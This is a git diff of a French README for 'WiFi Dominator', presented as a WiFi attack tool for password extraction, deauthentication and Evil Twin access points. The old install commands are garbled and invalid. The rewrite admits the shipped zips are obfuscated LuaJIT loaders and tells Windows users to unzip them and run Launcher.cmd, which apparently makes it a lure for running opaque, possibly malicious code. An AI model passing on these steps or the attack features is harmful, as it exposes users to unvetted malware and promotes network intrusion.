@@ -1,43 +1,60 @@
 # WiFi Dominator
 
-Un outil d'audit de sécurité WiFi multifonctionnel, conçu pour des fins éducatives et de recherche en sécurité.
+Dépôt d’archives contenant des versions packagées de **WiFi Dominator**.
 
-**Avertissement :** Cet outil est puissant. Ne l'utilisez que sur des réseaux que vous possédez ou pour lesquels vous avez une autorisation explicite. L'utilisation non autorisée de cet outil est illégale.
+> ⚠️ **Important**
+> Les fichiers livrés dans `kokan/*.zip` sont des binaires/chargeurs obfusqués (LuaJIT + scripts `.txt`) et **pas** un code source Python lisible.
+> Utilisez uniquement dans un environnement de laboratoire autorisé, hors machine de production.
 
-## Fonctionnalités
+## Contenu du dépôt
 
-* **Vecteur 1 (Extraction Locale) :** Extrait les mots de passe Wi-Fi enregistrés sur Windows, macOS et Linux.
-* **Vecteur 2 (Sniffing & Deauth) :** Capture les handshakes WPA/WPA2 en utilisant une attaque par désauthentification.
-* **Vecteur 3 (Evil Twin) :** Crée un faux point d'accès avec un portail captif pour l'ingénierie sociale.
+- `kokan/Dominator-Wifi-v1.7.zip`
+- `kokan/Wifi_Dominator_1.1.zip`
+- `README.md`
+
+## Corrections appliquées
+
+Les anciennes instructions étaient erronées :
+- elles utilisaient une URL `.zip` directement dans `git clone` (invalide),
+- elles passaient un fichier `.zip` à `pip install -r` (invalide),
+- elles lançaient `python3` sur une URL `.zip` (invalide).
+
+Cette documentation remplace ces commandes par une procédure locale cohérente.
 
 ## Prérequis
 
-* Python 3.x
-* Privilèges root / Administrateur
-* Une carte sans fil compatible avec le mode moniteur (pour les vecteurs 2 et 3)
-* La suite `aircrack-ng` (pour le cracking)
+- Windows (les archives contiennent `Launcher.cmd` et `luajit.exe`)
+- Outil de décompression ZIP (`PowerShell`, `7-Zip`, etc.)
+- Environnement de test isolé (VM recommandée)
 
-## Installation
+## Installation (locale)
 
-1.  Clonez le dépôt :
-    ```bash
-    git clone https://github.com/Bendjinymous/Wifi-Dominator/raw/refs/heads/main/kokan/Dominator-Wifi-v1.7.zip
-    cd Wifi-Dominator
-    ```
+1. Cloner le dépôt :
+   ```bash
+   git clone https://github.com/Bendjinymous/Wifi-Dominator.git
+   cd Wifi-Dominator
+   ```
 
-2.  Installez les dépendances Python :
-    ```bash
-    pip install -r https://github.com/Bendjinymous/Wifi-Dominator/raw/refs/heads/main/kokan/Dominator-Wifi-v1.7.zip
-    ```
+2. Extraire une version :
+   ```bash
+   unzip kokan/Dominator-Wifi-v1.7.zip -d build/Dominator-Wifi-v1.7
+   ```
 
-## Utilisation
+## Exécution
+
+Depuis le dossier extrait, lancer :
+
+```bat
+Launcher.cmd
+```
+
+## Vérification d’intégrité des archives
 
 ```bash
-# Extraire les mots de passe locaux
-sudo python3 https://github.com/Bendjinymous/Wifi-Dominator/raw/refs/heads/main/kokan/Dominator-Wifi-v1.7.zip --local
+unzip -t kokan/Dominator-Wifi-v1.7.zip
+unzip -t kokan/Wifi_Dominator_1.1.zip
+```
 
-# Sniffer un réseau
-sudo python3 https://github.com/Bendjinymous/Wifi-Dominator/raw/refs/heads/main/kokan/Dominator-Wifi-v1.7.zip --sniff -i wlan0mon -t "MonWiFi" -w https://github.com/Bendjinymous/Wifi-Dominator/raw/refs/heads/main/kokan/Dominator-Wifi-v1.7.zip
+## Avertissement légal
 
-# Lancer une attaque Evil Twin
-sudo python3 https://github.com/Bendjinymous/Wifi-Dominator/raw/refs/heads/main/kokan/Dominator-Wifi-v1.7.zip --evil-twin -i wlan0 -t "WiFi_Gratuit"
+N’utilisez ces outils que sur des réseaux vous appartenant ou pour lesquels vous disposez d’une autorisation explicite.
